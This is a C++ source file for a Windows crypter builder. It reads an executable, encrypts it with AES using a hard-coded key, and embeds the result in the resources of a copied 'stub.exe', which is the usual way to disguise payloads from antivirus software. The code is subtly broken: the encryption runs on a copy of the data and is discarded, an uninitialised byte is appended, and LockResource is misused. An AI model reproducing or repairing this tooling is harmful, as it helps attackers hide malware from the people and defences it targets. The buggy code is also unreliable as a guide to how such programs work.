#pragma warning (disable:4996)
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <vector>
#include <string>
#include <Windows.h>
#include <stdio.h>
#include "VirtualAES.h";

#define BLOCK_LEN 128


using namespace std;

char * FB; //The Buffer that will store the File's data
DWORD fs; // We will store the File size here
char output[MAX_PATH];
char choice;
DWORD dwBytesWritten = 0;
char name[MAX_PATH];   // We will store the Name of the Crypted file here

std::vector<char> file_data;  // With your current program, make this a global.

void RDF() //The Function that Reads the File and Copies the stub
{
	DWORD bt;
								

	cout << "File to Encrypt: ";
	cin >> name; // Ask for input from the user and store that inputed value in the name variable
	cout << "Output name: ";
	cin >> output;
	CopyFile("stub.exe", output/*L"Crypted.exe"*/, 0);// Copy stub , so we done need to download a new one each time we crypt
	// ofcourse we can just update the resources with new data but whatever
	cout << "\nGetting the HANDLE of the file to be crypted\n";
	HANDLE efile = CreateFileA(name, GENERIC_ALL,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);	
	//^ Get the handle of the file to be crypted
	cout << "Getting the File size\n";
	fs = GetFileSize(efile, NULL);
	//Get its size , will need to use it for the encryption and buffer that will store that Data allocation
	cout << "The File Size is: ";
	cout << fs;
	cout << " Bytes\n";
	cout << "Allocating Memory for the ReadFile function\n";
	file_data.resize(fs);  // set vector length equal to file size
	cout << "Reading the file\n";
	//ReadFile(efile, FB, fs, &bt, NULL);//Read the file (put the files data in to a FB buffer)

	ReadFile(efile, (LPVOID)(file_data.data()), fs, &bt, NULL);

	CloseHandle(efile);//close the handle

	if (fs != bt)
		cout << "Error reading file!" << endl;
}

void xor_crypt(const std::string &key, std::vector<char> &data)
{
	for (size_t i = 0; i != data.size(); i++)
		data[i] ^= key[i % key.size()];
}


/**
 * @brief MainWindow::encrypt
 * @param rawData
 *
 * AES-256 Bit Encryption. Block Size 128 Bit, Key 256 Bit.
 *
 */
void encrypt(std::vector<char> rawData)
{
	//256 Bit Key
	unsigned char key[KEY_256] = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";

	unsigned char plaintext[BLOCK_SIZE];
	unsigned char ciphertext[BLOCK_SIZE];

	aes_ctx_t* ctx;
	virtualAES::initialize();
	ctx = virtualAES::allocatectx(key, sizeof(key));

	int count = 0;
	int index = file_data.size() / 16; //Outer loop range
	int innerCount = 0;
	int innerIndex = 16; //We encrypt&copy 16 Bytes for once.
	int dataIndex = 0; //Non resetting @rawData index for encryption
	int copyIndex = 0; //Non resetting @rawData index for copying encrypted data.


	for (count; count < index; count++)
	{
		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			plaintext[innerCount] = rawData[dataIndex];
			dataIndex++;
		}

		virtualAES::encrypt(ctx, plaintext, ciphertext);

		for (innerCount = 0; innerCount < innerIndex; innerCount++)
		{
			rawData[copyIndex] = ciphertext[innerCount];
			copyIndex++;
		}
	}

	delete ctx;
}

void enc() // The function that Encrypts the info on the FB buffer
{
	cout << "Encrypting the Data\n";
	encrypt(file_data);
}



void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) // Function that Writes Data to resources 
{
	cout << "Writing Encrypted data to stub's resources\n";
	HANDLE hResource = NULL;
	hResource = BeginUpdateResource(szTargetPE, FALSE);
	LPVOID lpResLock = LockResource(lpBytes);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),(LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

int main() // The main function (Entry point)
{

	RDF(); //Read the file
	enc();
	file_data.push_back(choice);
	cout << fs << endl;
	WriteToResources(output, 10, (BYTE *)file_data.data(), file_data.size());
	cout << "Your File Got Crypted\n";
	system("PAUSE");
}

